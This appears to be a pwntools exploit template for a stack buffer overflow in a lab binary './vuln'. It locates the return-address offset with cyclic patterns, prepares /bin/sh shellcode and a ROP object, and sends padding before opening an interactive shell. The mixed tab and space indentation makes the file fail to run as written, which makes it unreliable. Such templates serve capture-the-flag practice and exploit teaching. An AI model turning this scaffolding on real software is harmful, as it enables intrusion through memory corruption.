import os
from pwn import *


HOST = '127.0.0.1'
PORT = 1337


def start(argv=[], *a, **kw):
	"""Switch between local/GDB/remote """
    if args.GDB:
        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
    	return remote(HOST, PORT, *a, **kw)
    else:
        return process([binary] + argv, *a, **kw)


def get_ip_location(payload):
	"""Locates the IP offset"""
	p = process(binary)
	p.sendlineafter(':', payload)
	p.wait()
	#ip_offset = cyclic_find(p.corefile.pc) # x86
	ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
	info('located EIP/RIP offset at {a}'.format(a=ip_offset))
	os.system('/usr/bin/rm core.*')
	return ip_offset


# Write a GDB script here for debugging
gdbscript = '''
continue
'''.format(**locals())


# Set up Pwntools 
binary = './vuln'
elf = context.binary = ELF(binary, checksec=False)
# Logging level (info/debug)
context.log_level = 'info'

#pprint(elf.symbols)

# ===============================================================
#			SHELLCODE GOES HERE
# ===============================================================

sh = shellcraft.sh()

custom_shellcode = '''

'''% (locals())

shellcode = asm(sh)
#shellcode = asm(custom_shellcode)

# ===============================================================
#			ROPCHAINS GOES HERE
# ===============================================================

rop = ROP(elf)

#print(rop.dump())
#pprint(rop.gadgets)

# =============================================================
#			EXPLOIT GOES HERE
# =============================================================

exploit = start()

offset = get_ip_location(cyclic(100))

# Build the payload
payload = b'A' * offset

# Send the payload
exploit.sendlineafter(b':', payload)

#exploit.recv()
exploit.interactive()
